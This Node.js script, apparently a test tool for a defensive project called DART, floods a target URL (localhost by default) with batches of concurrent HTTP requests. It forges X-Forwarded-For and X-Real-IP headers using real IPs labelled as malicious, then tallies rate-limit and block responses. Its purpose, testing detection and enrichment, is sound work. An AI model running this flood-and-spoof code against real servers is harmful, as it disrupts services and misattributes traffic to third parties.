#!/usr/bin/env node

/**
 * ddos.js — DDoS Attack Simulator with IP Spoofing
 *
 * Fires batches of concurrent HTTP requests with spoofed
 * X-Forwarded-For headers containing known-malicious IPs.
 * This produces real enrichment data from threat intel APIs.
 *
 * Usage: node scripts/ddos.js
 */

// ----- Known-malicious IPs for spoofing -----
const SPOOF_IPS = [
  "185.220.101.34",   // Tor exit node, malicious on all APIs
  "45.142.212.100",   // Mass scanner, 100% AbuseIPDB score
  "89.248.167.131",   // Shodan scanner, rich GreyNoise data
  "198.235.24.130",   // Known botnet C2, high VT votes
  "80.82.77.139",     // Shodan/scanner, GreyNoise malicious tags
];

function randomSpoofIP() {
  return SPOOF_IPS[Math.floor(Math.random() * SPOOF_IPS.length)];
}

// ----- Configuration -----
const TARGET_URL =
  process.env.TARGET_URL || "http://localhost:3002/api/data";
const REQUESTS_PER_BATCH = parseInt(process.env.REQUESTS_PER_BATCH, 10) || 50;
const BATCH_INTERVAL_MS = parseInt(process.env.BATCH_INTERVAL_MS, 10) || 500;
const DURATION_SECONDS = parseInt(process.env.DURATION_SECONDS, 10) || 60;

// ----- Stats -----
let totalSent = 0;
let totalSuccess = 0;
let totalErrors = 0;
let total429 = 0;
let total403 = 0;
let batchNumber = 0;

console.log("=".repeat(60));
console.log("  DART DDoS Attack Simulator (with IP Spoofing)");
console.log("=".repeat(60));
console.log(`  Target:     ${TARGET_URL}`);
console.log(`  Batch Size: ${REQUESTS_PER_BATCH} requests`);
console.log(`  Interval:   ${BATCH_INTERVAL_MS}ms`);
console.log(`  Duration:   ${DURATION_SECONDS}s`);
console.log(`  Spoof IPs:  ${SPOOF_IPS.join(", ")}`);
console.log("=".repeat(60));
console.log("");

const startTime = Date.now();
const endTime = startTime + DURATION_SECONDS * 1000;

/**
 * Send a single request with a spoofed IP header.
 * Returns the spoofed IP used.
 */
async function sendRequest() {
  const spoofIP = randomSpoofIP();
  try {
    const res = await fetch(TARGET_URL, {
      headers: {
        "X-Forwarded-For": spoofIP,
        "X-Real-IP": spoofIP,
        "User-Agent": "Mozilla/5.0 (compatible; scanner/1.0)",
      },
    });
    if (res.status === 429) {
      total429++;
    } else if (res.status === 403) {
      total403++;
    } else if (res.ok) {
      totalSuccess++;
    }
  } catch {
    totalErrors++;
  }
  return spoofIP;
}

/**
 * Fire one batch of concurrent requests.
 */
async function fireBatch() {
  batchNumber++;
  const promises = [];

  for (let i = 0; i < REQUESTS_PER_BATCH; i++) {
    promises.push(sendRequest());
  }

  const usedIPs = await Promise.all(promises);
  totalSent += REQUESTS_PER_BATCH;

  // Unique IPs used in this batch
  const uniqueIPs = [...new Set(usedIPs)];
  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);

  console.log(
    `  Batch ${String(batchNumber).padStart(4)}: sent ${REQUESTS_PER_BATCH} | ` +
      `OK: ${totalSuccess} | 429: ${total429} | 403: ${total403} | ` +
      `Err: ${totalErrors} | ${elapsed}s | IPs: ${uniqueIPs.join(", ")}`
  );
}

/**
 * Main loop — run batches until duration expires.
 */
async function main() {
  console.log("  🚀 Attack started with spoofed IPs!\n");

  while (Date.now() < endTime) {
    await fireBatch();
    if (Date.now() < endTime) {
      await new Promise((resolve) => setTimeout(resolve, BATCH_INTERVAL_MS));
    }
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
  console.log("");
  console.log("=".repeat(60));
  console.log("  Attack Complete — Summary");
  console.log("=".repeat(60));
  console.log(`  Duration:       ${totalTime}s`);
  console.log(`  Total Requests: ${totalSent}`);
  console.log(`  Successful:     ${totalSuccess}`);
  console.log(`  Rate Limited:   ${total429}`);
  console.log(`  IP Blocked:     ${total403}`);
  console.log(`  Errors:         ${totalErrors}`);
  console.log(`  Batches:        ${batchNumber}`);
  console.log(`  Avg req/s:      ${(totalSent / parseFloat(totalTime)).toFixed(1)}`);
  console.log(`  Spoofed IPs:    ${SPOOF_IPS.join(", ")}`);
  console.log("=".repeat(60));
}

main().catch((err) => {
  console.error("Fatal error:", err);
  process.exit(1);
});
